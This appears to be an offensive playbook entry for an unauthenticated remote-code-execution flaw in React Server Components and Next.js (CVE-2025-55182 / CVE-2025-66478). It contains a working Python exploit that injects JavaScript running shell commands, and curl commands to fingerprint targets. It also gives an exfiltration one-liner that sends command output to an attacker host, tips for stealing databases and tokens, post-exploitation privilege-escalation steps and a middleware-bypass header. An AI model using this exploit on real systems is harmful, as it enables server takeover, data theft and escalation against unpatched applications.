# React Server Components Flight Deserialization (CVE-2025-55182 / "React2Shell", CVE-2025-66478)

## When this applies

- Target runs **Next.js** (App Router) or any framework embedding **React Server Components (RSC)** with one of these packages: `react-server-dom-webpack`, `react-server-dom-turbopack`, `react-server-dom-parcel`.
- Affected React versions: **19.0.0, 19.1.0, 19.1.1, 19.2.0**. Fixed in **19.0.1 / 19.1.2 / 19.2.1**.
- Next.js prebuilt with vulnerable React (e.g. Next.js 15.0.x ships React 19 RC). Fingerprint via the version string baked into the client chunk (see Detection).
- No authentication is required. Bug lives in the Server Function endpoint deserializer.

## Why it works

The Flight protocol parses multipart `form-data` rows into JS values, then resolves any object whose `then` field is a string reference (`$N:path`) as if it were a Promise. The deserializer walks attacker-controlled `_response._prefix` / `_response._formData` paths and ends up evaluating a constructor-as-function gadget. Because `_prefix` is concatenated into a `new Function(...)` body, the attacker controls the JS source executed inside the Node runtime.

The trigger is the `next-action` request header (or any Server Action endpoint). The action ID does **not** need to exist — sending the header alone routes the body into the Flight deserializer.

## Detection

```bash
TARGET=http://<target>:3000
# Pull a JS chunk that bundles react-server-dom-* and grep for the React version.
curl -s "$TARGET/" | grep -oE '/_next/static/chunks/[A-Za-z0-9._-]+\.js' | sort -u \
  | xargs -I{} curl -s "$TARGET{}" \
  | grep -oE 'version[ :=]*"(19\.[0-2]\.[0-9](-rc[^"]*)?)"' | sort -u

# Confirm Server Action plumbing — a POST with the Next-Action header on a prerendered
# page still returns 200/500 instead of 405 (regular POST returns 405 + Allow: GET, HEAD).
curl -s -o /dev/null -w "no-header=%{http_code}\n" -X POST "$TARGET/"
curl -s -o /dev/null -w "with-action=%{http_code}\n" -X POST "$TARGET/" \
     -H "next-action: x" -H "Content-Type: text/plain" -d '[]'
```

A vulnerable target gives `200` (cache hit) with the action header. After firing the exploit body, expect HTTP `500` with a React Flight error row like `1:E{"digest":"<hex>"}` — the digest hides the real exception, but the JS already ran.

## Payload structure

The exploit body is **multipart/form-data**. Field "0" references field "1"; field "1" is a fake resolved chunk whose `then` chains to field "2" → `$@3`; fields "2"-"4" set up the constructor gadget; field "5" carries the JS in `_prefix`.

| Field | Body | Role |
|---|---|---|
| 0 | `"$1"` | Entry pointer |
| 1 | `{"status":"resolved_model","reason":0,"_response":"$5","value":"{\"then\":\"$4:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}","then":"$2:then"}` | Fake resolved chunk |
| 2 | `"$@3"` | Bound function placeholder |
| 3 | `""` | Empty string |
| 4 | `[]` | Empty array (target for `:map`) |
| 5 | `{"_prefix":"<JS>//","_formData":{"get":"$4:constructor:constructor"},"_chunks":"$2:_response:_chunks","_bundlerConfig":{}}` | Code injection + constructor gadget |

The trailing `//` in `_prefix` line-comments any wrapper code the runtime appends.

### Minimal Python PoC

```python
import json, sys, requests

target = sys.argv[1]                # http://<target>:3000
command = sys.argv[2]               # shell command
boundary = "----WebKitFormBoundaryReactCVE"
cmd = command.replace('"', '\\"')
js = ('(function(){try{var r=process.mainModule.require("child_process")'
      f'.execSync("{cmd}").toString();throw new Error("[RCE] "+r);}}'
      'catch(e){throw e;}})()')

def part(name, content):
    return f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{content}\r\n'

body = (
    part('0', '"$1"')
  + part('1', '{"status":"resolved_model","reason":0,"_response":"$5",'
              '"value":"{\\"then\\":\\"$4:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}",'
              '"then":"$2:then"}')
  + part('2', '"$@3"') + part('3', '""') + part('4', '[]')
  + part('5', json.dumps({"_prefix": js + "//",
                          "_formData": {"get": "$4:constructor:constructor"},
                          "_chunks": "$2:_response:_chunks",
                          "_bundlerConfig": {}}))
  + f'--{boundary}--\r\n'
)

r = requests.post(target, data=body, headers={
    "next-action": "x",
    "Content-Type": f"multipart/form-data; boundary={boundary}",
    "Accept": "text/x-component",
})
print(r.status_code, r.text[:200])
```

Send to the **root** of the app; works even on statically-prerendered pages because the `next-action` header is intercepted before the page cache.

## Output exfiltration

The HTTP response body never echoes the executed JS output — the deserializer's exception is masked behind a Flight `E{"digest":"..."}` row. Confirm and exfil out-of-band:

```bash
# Listener on attacker box
python3 -m http.server 8000

# Trigger
python3 react2shell.py http://<target>:3000 \
  'curl -s "http://<attacker>:8000/?out=$(id|base64 -w0)"'
```

For larger artefacts (databases, source code, tokens) use a POST capture server and `curl -X POST --data-binary @<file>`. `nc -l > file` truncates on macOS — use a Python `BaseHTTPRequestHandler` that writes the request body to disk instead.

## Post-RCE next steps

1. Read `/etc/passwd` → identify real users vs the service account (Node usually runs as `node`).
2. Pull any SQLite/JSON databases under the app dir (`/opt/<app>/*.db`, `*.json`) — hashes there bridge from `node` to a real user via SSH.
3. Check `ss -tlnp` for **`--inspect` listeners on 127.0.0.1:9229** — root-owned Node processes with the inspector port are a one-step privesc. See [`../../system/reference/scenarios/linux-privesc/nodejs-inspector-abuse.md`](../../../../system/reference/scenarios/linux-privesc/nodejs-inspector-abuse.md).

## Variants

- **CVE-2025-66478** — same deserialization sink reached via a different Next.js code path (Server Components Payload route under `/_next/`). Use the same body, swap the URL to `/__action__` / `/_next/_action/...` if `/` rejects.
- **Custom Next.js middleware that strips `next-action`** — replay with `Next-Action` (any casing) or via a path that bypasses middleware (CVE-2025-29927's `x-middleware-subrequest: middleware:...:middleware` chain disables middleware on Next.js < 15.2.3).

## Anti-Patterns

- Sending `application/json` instead of `multipart/form-data` — the action handler short-circuits before the Flight parser ever runs.
- Forgetting the `next-action` header — the request is routed to the static page renderer and returns 405.
- Trying to read the JS output from the HTTP response — the runtime masks it; design the payload to phone home from the start.
